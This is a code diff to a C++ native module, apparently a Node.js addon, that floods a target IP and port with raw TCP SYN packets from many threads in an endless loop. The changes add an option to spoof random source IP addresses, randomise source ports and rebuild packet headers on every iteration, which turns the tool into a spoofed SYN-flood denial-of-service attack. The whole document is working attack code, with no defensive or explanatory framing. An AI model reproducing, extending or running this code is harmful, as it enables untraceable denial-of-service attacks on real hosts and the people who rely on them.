@@ -134,6 +134,11 @@ char *generate_ipv4()
     return ipv4_str;
 }
 
+/* Generate random port*/
+int generate_port() {
+    return ((rand() % (65535-10240+1)) + 10240);
+}
+
 uint16_t ip_checksum(const void *buf, size_t hdr_len)
 {
     const uint16_t *data = static_cast<const uint16_t *>(buf);
@@ -180,9 +185,11 @@ uint16_t tcp_checksum(uint16_t *buffer, int size)
 }
 
 /* Fill in IP header, TCP header, Pseudo TCP header */
-void init_header(struct Ip *ip, struct Tcp *tcp, struct Pseudo *pseudo)
+void init_header(struct Ip *ip, struct Tcp *tcp, struct Pseudo *pseudo, int fakeIp, struct in_addr sin_addr)
 {
     int len = sizeof(struct Ip) + sizeof(struct Tcp);
+    char *src_ip = inet_ntoa(*(struct in_addr *)&sin_addr);
+    if(fakeIp == 1) src_ip = generate_ipv4();
 
     // IP header
     ip->ver_ihl = (4 << 4 | sizeof(struct Ip) / sizeof(unsigned int));
@@ -193,11 +200,11 @@ void init_header(struct Ip *ip, struct Tcp *tcp, struct Pseudo *pseudo)
     ip->ttl = 255;
     ip->proto = IPPROTO_TCP;
     ip->checksum = 0;
-    ip->saddr = 0;
+    ip->saddr = inet_addr(src_ip);
     ip->daddr = inet_addr(dst_ip);
 
     // TCP header
-    tcp->sport = htons(rand() % 16383 + 49152);
+    tcp->sport = htons(generate_port());
     tcp->dport = htons(dst_port);
     tcp->seq = htonl(rand() % 90000000 + 2345);
     tcp->ack = 0;
@@ -215,7 +222,7 @@ void init_header(struct Ip *ip, struct Tcp *tcp, struct Pseudo *pseudo)
 }
 
 /* Send SYN package */
-void *send_SYN(void *addr_info, int timeout = 60, int delay = 1000)
+void *send_SYN(void *addr_info, int timeout = 60, int delay = 1000, int fakeIp = 0)
 {
     struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
     struct Ip ip;
@@ -228,11 +235,9 @@ void *send_SYN(void *addr_info, int timeout = 60, int delay = 1000)
     auto start_time = std::chrono::steady_clock::now();
     srand((unsigned)time(NULL));
 
-    init_header(&ip, &tcp, &pseudo);
-
     while (true)
     {
-        ip.saddr = inet_addr(generate_ipv4());
+        init_header(&ip, &tcp, &pseudo, fakeIp, addr->sin_addr);
 
         // Calculate IP checksum
         memset(buf, 0, sizeof(buf));
@@ -289,6 +294,7 @@ void Method(const FunctionCallbackInfo<Value> &args)
     int timeout = args[2]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int numThreads = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();
+    int fakeIp = args[5]->Int32Value(isolate->GetCurrentContext()).ToChecked();
 
     // Get the destination IP address and port number from the arguments
     String::Utf8Value str_ip(isolate, args[0]);
@@ -323,7 +329,7 @@ void Method(const FunctionCallbackInfo<Value> &args)
     std::thread threads[numThreads];
     for (int i = 0; i < numThreads; i++)
     {
-        threads[i] = std::thread(send_SYN, &addr, timeout, delay);
+        threads[i] = std::thread(send_SYN, &addr, timeout, delay, fakeIp);
 
         if (threads[i].get_id() == std::thread::id())
         {
